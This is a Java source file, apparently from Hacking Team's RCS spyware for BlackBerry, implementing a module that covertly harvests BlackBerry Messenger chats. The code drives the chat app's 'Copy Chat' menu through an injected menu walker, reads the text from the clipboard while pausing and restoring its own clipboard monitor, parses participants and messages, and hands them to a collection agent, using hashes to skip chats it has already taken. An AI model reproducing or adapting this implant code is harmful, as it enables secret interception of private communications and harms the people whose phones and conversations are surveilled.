//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.ClipBoardAgent;
import blackberry.agent.ImAgent;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.utils.StringUtils;

public class ConversationScreen {
    //#ifdef DEBUG
    private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
    //#endif

    private static Vector parts;

    private UiApplication bbmApplication;
    private Vector conversationScreens = new Vector();
    Hashtable conversations = new Hashtable();

    public void setBBM(UiApplication bbmApplication) {
        this.bbmApplication = bbmApplication;
        //this.conversationScreens=conversationScreens;

        //#ifdef DEBUG
        debug.info("conversation Leech: " + conversationScreens);
        //#endif
    }

    public synchronized void getConversationScreen() {
        try {
            if (bbmApplication == null || !Backlight.isEnabled()) {
                //#ifdef DEMO
                Debug.ledFlash(Debug.COLOR_RED);
                //#endif
                return;
            }

            Screen screen = bbmApplication.getActiveScreen();

            //#ifdef DEBUG
            debug.info("leech active screen: " + screen);
            //#endif

            if (bbmApplication.isForeground()) {
                if (screen.getClass().getName().indexOf("ConversationScreen") >= 0) {

                    String conversation = extractConversation(screen);

                    if (!conversationScreens.contains(screen)) {
                        //#ifdef DEBUG
                        debug.info("Added new conversation screen: " + screen);
                        //#endif
                        conversationScreens.addElement(screen);
                        conversations.put(screen,
                                new Integer(Encryption.CRC32(conversation)));

                        // exploreField(screen, 0, new String[0]);
                    } else {
                        // se conversation e' uguale all'ultima parsata non fare niente.
                        Integer hash = (Integer) conversations.get(screen);
                        if (hash.equals(new Integer(Encryption
                                .CRC32(conversation)))) {
                            //#ifdef DEBUG
                            debug.trace("getConversationScreen: equal conversation, ignore it");
                            //#endif
                            return;
                        }
                    }

                    // parse della conversazione.
                    // result e' un vettore di stringhe
                    Vector result = parseConversation(conversation);

                    if (result != null) {
                        //#ifdef DBC
                        Check.asserts(result.size() == 2,
                                "wrong size result:  " + result.size());
                        //#endif

                        String partecipants = (String) result.elementAt(0);
                        Vector lines = (Vector) result.elementAt(1);

                        ImAgent agent = ImAgent.getInstance();
                        agent.add(partecipants, lines);

                        //#ifdef DEMO
                        Debug.ledFlash(Debug.COLOR_YELLOW);
                        //#endif
                    }
                } else {
                    //#ifdef DEBUG
                    debug.trace("getConversationScreen no screen: "
                            + screen.getClass().getName());
                    //#endif
                }
            }
            /*
             * if (screen.getClass().getName().indexOf("UserInfoScreen") >= 0) {
             * if (Backlight.isEnabled()) { //FieldExplorer explorer = new
             * FieldExplorer(); //Vector textfields = explorer.explore(screen,
             * true); } }
             */
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("getConversationScreen: " + ex);
            ex.printStackTrace();
            //#endif

        }
        return;
    }

    private String extractConversation(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractConversation");
        //#endif

        //String before = (String) Clipboard.getClipboard().get();
        String clip = null;
        // debug.trace("try copy chat: "+screen);
        ClipBoardAgent.getInstance().suspendClip();
        if (MenuWalker.walk(new String[] { "Copy Chat", "Copy History" },
                screen, true)) {

            clip = (String) Clipboard.getClipboard().get();
            ClipBoardAgent.getInstance().setClip(clip);

            if (!conversationScreens.contains(screen)) {
                //#ifdef DEBUG
                debug.info("adding clip to screens: " + clip);
                //#endif
            }

        } else {
            //#ifdef DEBUG
            debug.info("NO Conversation screen!");
            //#endif
        }
        ClipBoardAgent.getInstance().resumeClip();
        return clip;
    }

    /**
     * parse conversation
     * @param conversation
     * @return Vector<String partecipants, Vector<String line> lines>
     */
    public static Vector parseConversation(String conversation) {
        // Participants:
        // -------------
        // Torcione, Whiteberry
        //
        // Messages:
        // ---------
        // Torcione: Scrivo anche a he

        try {
            int pos = conversation.indexOf("-------------");
            String partecipants;
            //String partecipant1, partecipant2;

            int partStart = conversation.indexOf("\n", pos) + 1;
            int partSep = conversation.indexOf(", ", partStart);
            int partEnd = conversation.indexOf("\n", partSep);

            partecipants = conversation.substring(partStart, partEnd).trim();

            parts = StringUtils.split(partecipants, ", ");

            Vector result = new Vector();

            int posMessages = getLinePos(conversation, 6);
            int numLine = 1;

            Vector lines = new Vector();

            // per ogni linea
            //   se e' un inizio
            //       si elabora la last
            //       last = current.startAfter(partecipant)
            //   senno' 
            //       last += current
            // elabora la last

            String lastLine = "";
            while (true) {
                String currentLine = getNextLine(conversation, posMessages);
                if (currentLine == null) {
                    break;
                }
                posMessages += currentLine.length() + 1;

                if (numLine < 5) {
                    //#ifdef DEBUG
                    debug.trace("line " + numLine + " : " + currentLine);
                    //#endif
                }
                numLine += 1;

                int lineStart = searchPartecipant(currentLine);

                if (lineStart > 0) {
                    // c'e' un partecipante
                    // elabora la linea precedente
                    //#ifdef DEBUG
                    debug.trace("parseConversation part line: "
                            + currentLine);
                    //#endif
                    lines.addElement(lastLine.trim());
                    lastLine = currentLine;
                } else {
                    //#ifdef DEBUG
                    debug.trace("parseConversation adding line: " + currentLine);
                    //#endif
                    lastLine += " " + currentLine;
                }

            }
            //adding last line
            lines.addElement(lastLine.trim());

            //agent.add(partecipants, lines);
            //#ifdef DEBUG
            debug.info("num lines: " + numLine);
            //#endif
            result.addElement(partecipants);
            result.addElement(lines);

            //#ifdef DBC
            Check.ensures(result.size() == 2, "wrong size result");
            //#endif
            return result;
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("parseConversation: " + ex);
            //#endif
            return null;
        }

    }

    // se ci sono i partecipanti, restituisce la posizione dopo il :
    // senno 0
    private static int searchPartecipant(String currentLine) {
        int pos = 0;

        pos = currentLine.indexOf(": ");
        if (pos > 0) {
            String part = currentLine.substring(0, pos);
            if (parts.contains(part)) {
                return pos + 2;
            }
        }

        return 0;
    }

    /**
     * get the next line of conversation starting from posMessage
     * 
     * @param conversation
     * @param posMessages
     * @return
     */
    private static String getNextLine(String conversation, int posMessages) {

        int endLinePos = conversation.indexOf("\n", posMessages);
        if (endLinePos > 0) {
            return conversation.substring(posMessages, endLinePos);
        } else {
            return null;
        }
    }

    /**
     * Retrieves the numLine line of conversation
     * 
     * @param conversation
     * @param numLine
     * @return
     */
    private static int getLinePos(String conversation, int numLine) {
        int nextLine = 0;
        for (int i = 0; i < numLine; i++) {
            nextLine = conversation.indexOf("\n", nextLine) + 1;
        }
        return nextLine;
    }

    public int size() {

        return conversationScreens.size();
    }

    public Screen elementAt(int i) {
        return (Screen) conversationScreens.elementAt(i);
    }

}
